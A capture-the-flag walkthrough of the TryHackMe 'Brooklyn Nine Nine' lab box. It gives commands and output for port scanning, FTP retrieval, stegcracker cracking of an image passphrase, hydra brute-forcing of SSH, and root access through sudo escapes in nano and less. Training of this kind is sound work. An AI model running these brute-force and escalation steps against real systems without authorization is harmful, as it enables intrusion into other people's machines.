# Tryhackme room address

**https://tryhackme.com/room/brooklynninenine**

> This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box


> **nmap -sC -sV 10.10.101.251**

visit the webpage
analyse source 
we got a hint 
```
Have you ever heard of steganography?
```
lets download the image

**wget http://10.10.101.251/brooklyn99.jpg**
looks like the image is password protected

let's look into our nmap scan result now

we have ftp,ssh and http

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-29 01:50 IST
Stats: 0:02:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 90.07% done; ETC: 01:53 (0:00:16 remaining)
Nmap scan report for 10.10.101.251
Host is up (1.8s latency).
Not shown: 978 closed ports
PORT      STATE    SERVICE         VERSION
21/tcp    open     ftp             vsftpd 3.0.3
22/tcp    open     ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
49/tcp    filtered tacacs
80/tcp    open     http            Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
306/tcp   filtered unknown
444/tcp   filtered snpp
912/tcp   filtered apex-mesh
1002/tcp  filtered windows-icfw
1041/tcp  filtered danf-ak2
1087/tcp  filtered cplscrambler-in
1148/tcp  filtered elfiq-repl
1169/tcp  filtered tripwire
1641/tcp  filtered invision
2601/tcp  filtered zebra
5003/tcp  filtered filemaker
6692/tcp  filtered unknown
9898/tcp  filtered monkeycom
9944/tcp  filtered unknown
11111/tcp filtered vce
18988/tcp filtered unknown
32778/tcp filtered sometimes-rpc19
51103/tcp filtered unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


```
let's check out ftp 

ftp <machine ip>

mget note_to_jake.txt

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

```

from here we have two ways to get into machine  


## Methode 1 : bruteforcing the image 

we can  try  bruteforcing the imgage file with stegcracker   

> **stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt**  

is you dont have stegcrack you can install it by  

> **pip3 install stegcracker** 

```
Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: <password>
Tried 20523 passwords
Your file has been written to: brooklyn99.jpg.out

```

let's extract the data  

> **steghide extract -sf brooklyn99.jpg -p <password>**

```
Holts Password:
<holt's password>

Enjoy!!
```

ssh into the machine  

you have the user flag  

run **sudo -l**  

```
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

we can use nano to execute commands  

> sudo nano  

> ctrl+r and ctrl+x  

> reset; sh 1>&0 2>&0  

you are now root user

## Methode 2 : bruteforcing ssh

Jake's password is weak  so we can give it a try with hydra on ssh

> **hydra -l Jake -P /usr/share/wordlists/rockyou.txt 10.10.142.237 -f -t 4 ssh**  
use -f to exit when a login/pass pair is found  

```
/10.10.98.234 -f -t 4 
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-29 23:58:44
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.98.234:22/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344355 to do in 5433:29h, 4 active
[22][ssh] host: 10.10.98.234   login: jake   password: <ssh password>
[STATUS] attack finished for 10.10.98.234 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

ssh into jake 

user.txt is on home folder of holt  


let's do **sudo -l**

```
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less

```

> **sudo less /etc/profile**

> **!/bin/bash**

you're root now 

